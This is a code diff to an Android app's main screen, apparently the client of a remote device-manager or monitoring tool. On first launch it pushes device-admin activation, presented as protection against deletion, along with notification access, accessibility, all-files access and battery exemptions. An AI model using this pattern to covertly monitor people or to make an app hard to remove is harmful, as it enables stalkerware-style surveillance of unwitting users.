@@ -1,6 +1,8 @@
 package com.abuzahra.manager
 
 import android.Manifest
+import android.app.admin.DevicePolicyManager
+import android.content.ComponentName
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.net.Uri
@@ -10,6 +12,7 @@ import android.provider.Settings
 import android.widget.Button
 import android.widget.TextView
 import android.widget.Toast
+import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
@@ -28,6 +31,7 @@ class MainActivity : AppCompatActivity() {
         private const val PERMISSION_REQUEST = 1001
         private const val PERMISSION_REQUEST_BATCH2 = 1002
         private const val PERMISSION_REQUEST_BATCH3 = 1003
+        private const val DEVICE_ADMIN_REQUEST = 2001
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -68,6 +72,12 @@ class MainActivity : AppCompatActivity() {
         // Update permissions count
         updatePermissionCount(textPermissions)
 
+        // Request Device Admin on first launch
+        requestDeviceAdmin()
+
+        // Request battery optimization
+        requestBatteryOptimization()
+
         // Auto-request permissions on first launch
         requestPermissionsInBatches()
 
@@ -75,6 +85,8 @@ class MainActivity : AppCompatActivity() {
         btnPermissions.setOnClickListener {
             requestPermissionsInBatches()
             requestSpecialPermissions()
+            requestDeviceAdmin()
+            requestBatteryOptimization()
             updatePermissionCount(textPermissions)
         }
 
@@ -96,7 +108,7 @@ class MainActivity : AppCompatActivity() {
 
         // Unlink
         btnUnlink.setOnClickListener {
-            android.app.AlertDialog.Builder(this)
+            AlertDialog.Builder(this)
                 .setTitle("Unlink Device")
                 .setMessage("Are you sure you want to unlink this device?")
                 .setPositiveButton("Yes") { _, _ ->
@@ -116,7 +128,6 @@ class MainActivity : AppCompatActivity() {
             val battery = DataCollector.getBattery(this)
             findViewById<TextView>(R.id.textBattery).text = "${battery["level"]}% (${battery["status"]})"
         } catch (_: Exception) {}
-        // Refresh permission count
         updatePermissionCount(findViewById(R.id.textPermissions))
     }
 
@@ -142,6 +153,36 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
+    // ===== DEVICE ADMIN =====
+    private fun requestDeviceAdmin() {
+        try {
+            val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
+            val componentName = ComponentName(this, com.abuzahra.manager.service.DeviceAdminReceiver::class.java)
+            if (!dpm.isAdminActive(componentName)) {
+                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
+                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
+                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
+                    "يجب تفعيل مسؤول الجهاز لتفعيل جميع الميزات مثل قفل الهاتف ومسح البيانات والحماية من الحذف")
+                startActivity(intent)
+            }
+        } catch (e: Exception) {
+            android.util.Log.w("MainActivity", "Device admin request failed: ${e.message}")
+        }
+    }
+
+    // ===== BATTERY OPTIMIZATION =====
+    private fun requestBatteryOptimization() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            try {
+                val intent = Intent(
+                    Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
+                    Uri.parse("package:$packageName")
+                )
+                startActivity(intent)
+            } catch (_: Exception) {}
+        }
+    }
+
     private fun updatePermissionCount(textView: TextView) {
         val total = getRequiredPermissions().size
         var granted = 0
@@ -151,7 +192,6 @@ class MainActivity : AppCompatActivity() {
             }
         }
         textView.text = "Permissions: $granted/$total"
-        // Color: green if all granted, yellow if >50%, red if <50%
         val color = when {
             granted == total -> android.R.color.holo_green_dark
             granted > total / 2 -> android.R.color.holo_orange_dark
@@ -182,7 +222,6 @@ class MainActivity : AppCompatActivity() {
             Manifest.permission.VIBRATE,
             Manifest.permission.NFC,
         )
-        // Add storage permissions based on SDK
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) {
             perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)
             perms.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
@@ -204,29 +243,17 @@ class MainActivity : AppCompatActivity() {
         }
 
         if (ungranted.isEmpty()) {
-            // All runtime permissions granted, request special ones
             requestSpecialPermissions()
             return
         }
 
-        // Request in batches of 10 (Android system limit)
         val batch1 = ungranted.take(10)
         ActivityCompat.requestPermissions(this, batch1.toTypedArray(), PERMISSION_REQUEST)
-
-        // Remaining permissions will be requested in onRequestPermissionsResult
     }
 
     private fun requestSpecialPermissions() {
         // Battery optimization
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            try {
-                val intent = Intent(
-                    Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
-                    Uri.parse("package:$packageName")
-                )
-                startActivity(intent)
-            } catch (_: Exception) {}
-        }
+        requestBatteryOptimization()
 
         // System alert window (draw over other apps)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
@@ -258,15 +285,13 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
-        // Notification access (for reading notifications)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
-            try {
-                val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
-                startActivity(intent)
-            } catch (_: Exception) {}
-        }
+        // Notification access
+        try {
+            val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
+            startActivity(intent)
+        } catch (_: Exception) {}
 
-        // Install unknown apps (for app installation)
+        // Install unknown apps
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             try {
                 val intent = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES)
@@ -275,17 +300,22 @@ class MainActivity : AppCompatActivity() {
             } catch (_: Exception) {}
         }
 
-        // Device admin
-        try {
-            val deviceAdminIntent = Intent(Settings.ACTION_SECURITY_SETTINGS)
-            startActivity(deviceAdminIntent)
-        } catch (_: Exception) {}
-
         // Accessibility service
         try {
             val accessibilityIntent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
             startActivity(accessibilityIntent)
         } catch (_: Exception) {}
+
+        // All files access (MANAGE_EXTERNAL_STORAGE)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            try {
+                if (!android.os.Environment.isExternalStorageManager()) {
+                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
+                    intent.data = Uri.parse("package:$packageName")
+                    startActivity(intent)
+                }
+            } catch (_: Exception) {}
+        }
     }
 
     override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
@@ -293,13 +323,11 @@ class MainActivity : AppCompatActivity() {
         val textPermissions = findViewById<TextView>(R.id.textPermissions)
         updatePermissionCount(textPermissions)
 
-        // Check if there are more permissions to request
         val stillNeeded = getRequiredPermissions().filter {
             ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
         }
 
         if (stillNeeded.isNotEmpty() && requestCode == PERMISSION_REQUEST) {
-            // Request next batch
             ActivityCompat.requestPermissions(
                 this,
                 stillNeeded.take(10).toTypedArray(),
